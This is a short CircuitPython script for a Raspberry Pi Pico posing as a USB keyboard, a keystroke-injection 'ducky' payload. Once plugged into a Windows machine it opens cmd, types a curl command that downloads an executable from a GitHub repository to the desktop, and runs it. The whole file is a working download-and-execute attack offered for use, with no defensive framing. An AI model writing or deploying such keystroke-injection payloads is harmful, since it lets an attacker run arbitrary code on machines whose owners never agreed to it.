import usb_hid
import time
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keycode import Keycode
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS

kbd = Keyboard(usb_hid.devices)
layout = KeyboardLayoutUS(kbd)

#open cmd
kbd.send(Keycode.WINDOWS, Keycode.R)
time.sleep(0.3)
layout.write("cmd")
kbd.send(Keycode.ENTER)

time.sleep(0.3)

#go to desktop to save github file there
layout.write("cd desktop")
kbd.send(Keycode.ENTER)

time.sleep(0.3)

#enter cmd command to clone script from github
"""github_link = "https://github.com/ByOle1307/RaspiPicoDucky/blob/main/github_script.exe""""
layout.write("curl ")
kbd.send(Keycode.FORWARD_SLASH)
layout.write("JLO https")
kbd.send(Keycode.SHIFT, Keycode.PERIOD)
kbd.send(Keycode.SHIFT, Keycode.SEVEN)
kbd.send(Keycode.SHIFT, Keycode.SEVEN)
layout.write("github")
kbd.send(Keycode.PERIOD)
layout.write("com")
kbd.send(Keycode.SHIFT, Keycode.SEVEN)
layout.write("BzOle1307")
kbd.send(Keycode.SHIFT, Keycode.SEVEN)
layout.write("RaspiPicoDuckz")
kbd.send(Keycode.SHIFT, Keycode.SEVEN)
layout.write("blob")
kbd.send(Keycode.SHIFT, Keycode.SEVEN)
layout.write("main")
kbd.send(Keycode.SHIFT, Keycode.SEVEN)
layout.write("github")
kbd.send(Keycode.SHIFT, Keycode.FORWARD_SLASH)
layout.write("script.exe")

kbd.send(Keycode.ENTER)

time.sleep(0.3)

#start github file
layout.write("github")
kbd.send(Keycode.SHIFT, Keycode.FORWARD_SLASH)
layout.write("script.exe")
kbd.send(Keycode.ENTER)
